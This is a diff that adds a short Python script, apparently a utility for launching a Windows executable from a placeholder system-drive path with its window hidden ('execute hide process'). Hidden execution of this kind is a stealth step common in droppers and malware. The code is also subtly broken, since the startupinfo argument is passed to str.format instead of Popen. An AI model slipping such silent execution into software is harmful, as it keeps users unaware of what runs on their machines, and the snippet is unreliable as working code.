@@ -1,0 +1,11 @@
+import subprocess
+import os , sys ,os.path
+ 
+def Hexecute(): #execute hide process
+    SW_HIDE = 0
+    info = subprocess.STARTUPINFO()
+    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+    info.wShowWindow = SW_HIDE
+    subprocess.Popen(r"{0}\~\file.exe".format(os.environ['systemdrive'], startupinfo=info)) #add name & path for ex \path\executefile.exe 
+
+Hexecute()
